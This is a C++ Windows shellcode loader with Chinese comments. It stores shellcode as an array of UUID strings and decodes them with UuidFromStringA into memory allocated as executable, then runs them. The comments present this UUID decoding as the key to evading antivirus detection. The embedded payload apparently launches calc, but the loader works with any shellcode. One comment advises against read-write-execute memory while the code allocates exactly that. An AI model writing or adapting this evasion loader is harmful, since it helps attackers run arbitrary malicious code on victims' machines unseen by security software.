#include <Windows.h>
#include <rpc.h>
#include <iostream>
#include <vector>
#pragma comment(lib, "Rpcrt4.lib")

int main() {
    // 1. 嵌入由Python脚本生成的UUID字符串数组
    const char* uuids[] = {
        "90909090-e8fc-0082-0000-6089e531c064", "8b30508b-0c52-528b-148b-72280fb74a26", "3cacff31-7c61-2c02-20c1-cf0d01c7e2f2", "528b5752-8b10-3c4a-8b4c-1178e34801d1", "20598b51-d301-498b-18e3-3a498b348b01", "acff31d6-cfc1-010d-c738-e075f6037df8", "75247d3b-58e4-588b-2401-d3668b0c4b8b", "d3011c58-048b-018b-d089-4424245b5b61", "ff515a59-5fe0-5a5f-8b12-eb8d5d6a018d", "0000b285-5000-3168-8b6f-87ffd5bbf0b5", "a66856a2-bd95-ff9d-d53c-067c0a80fbe0", "47bb0575-7213-6a6f-0053-ffd563616c63", "00000000-0000-0000-0000-000000000000"
    };
    int uuidCount = sizeof(uuids) / sizeof(uuids[0]);

    // 2. 计算所需内存大小：每个UUID代表16字节的shellcode
    SIZE_T shellcodeSize = uuidCount * 16;

    // 3. 分配内存（推荐先分配为可读写，执行前再修改权限）
    // 避免直接使用 PAGE_EXECUTE_READWRITE (RWX)，这非常可疑
    LPVOID mem = VirtualAlloc(nullptr, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


    // 4. 使用 UuidFromStringA 将UUID字符串解码并直接写入分配的内存
    //    这替代了 memcpy，是免杀的关键步骤
    PBYTE ptr = (PBYTE)mem;
    for (int i = 0; i < uuidCount; ++i) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)ptr);
        if (status != RPC_S_OK) {
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        ptr += 16; // 移动到下一个写入位置
    }

    // 6. 执行Shellcode
    ((void(*)())mem)();

    // 7. 清理（如果shellcode没有自行退出）
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}